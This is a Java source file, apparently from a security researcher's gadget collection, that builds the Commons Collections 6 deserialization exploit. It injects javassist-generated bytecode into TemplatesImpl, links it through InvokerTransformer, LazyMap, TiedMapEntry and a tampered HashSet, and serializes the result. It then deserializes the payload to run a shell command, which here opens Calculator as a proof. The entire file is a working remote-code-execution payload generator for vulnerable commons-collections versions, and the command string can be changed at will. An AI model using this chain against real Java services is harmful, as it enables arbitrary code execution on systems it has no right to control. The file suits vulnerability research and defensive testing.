package com.sec.exploits.CommonsCollections.CommonsCollections6;

import com.sec.annotation.Dependencies;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-17 11:47
 **/


/**
 * Gadget chain:
 *         ObjectInputStream.readObject()
 *             HashSet.readObject()
 *                 HashMap.put()
 *                 HashMap.hash()
 *                     TiedMapEntry.hashCode()
 *                     TiedMapEntry.getValue()
 *                         LazyMap.get()
 *   				         InvokerTransformer.transform()
 *   					        Method.invoke()
 *   						       TemplatesImpl.newTransformer()
 *   							      TemplatesImpl.getTransletInstance()
 *   							      TemplatesImpl.defineTransletClasses()
 *   							         Class.newInstance()
 *   								           Runtime.exec()
 */


@Dependencies({
        "commons-collections:commons-collections:3.1-3.2.1",
        "jdk1.7"
})
public class TemplatesImpl_HashSet_Exploit {
    public static void main(String[] args) throws  Exception{
        //1.先创建恶意类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass tempExploitClass = pool.makeClass("3xpl01t");
        //一定要设置父类，为了后续顺利
        tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        //写入payload，生成字节数组
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
        tempExploitClass.makeClassInitializer().insertBefore(cmd);
        byte[] exploitBytes = tempExploitClass.toBytecode();


        //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件
        TemplatesImpl tmpl = new TemplatesImpl();
        //设置_bytecodes属性为exploitBytes
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{exploitBytes});
        //一定要设置_name不为空
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmpl, "0range");
        //_class为空
        Field _class = TemplatesImpl.class.getDeclaredField("_class");
        _class.setAccessible(true);
        _class.set(tmpl, null);


        //3.构造InvokerTransformer
        InvokerTransformer iInvokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        //InvokerTransformer iInvokerTransformer = new InvokerTransformer("getOutputProperties",new Class[]{},new Object[]{});也可以

        HashMap innermap = new HashMap();
        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,iInvokerTransformer);
        TiedMapEntry tmap = new TiedMapEntry(lazymap, tmpl);//注意这里

        HashSet hashset = new HashSet(1);
        hashset.add("0range");

        //将map属性设置为我们的tmap
        //1.先拿到handle
        Field map = Class.forName("java.util.HashSet").getDeclaredField("map");
        map.setAccessible(true);
        HashMap hashset_map = (HashMap) map.get(hashset);
        //2.拿到map的table属性，里面应该存放entry
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);
        //3.将第一个entry的key设置为我们的tmap
        Object node = array[0];
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tmap);


        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc6_TemplatesImpl_HashSet.ser")));
        fout.writeObject(hashset);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc6_TemplatesImpl_HashSet.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();

    }
}
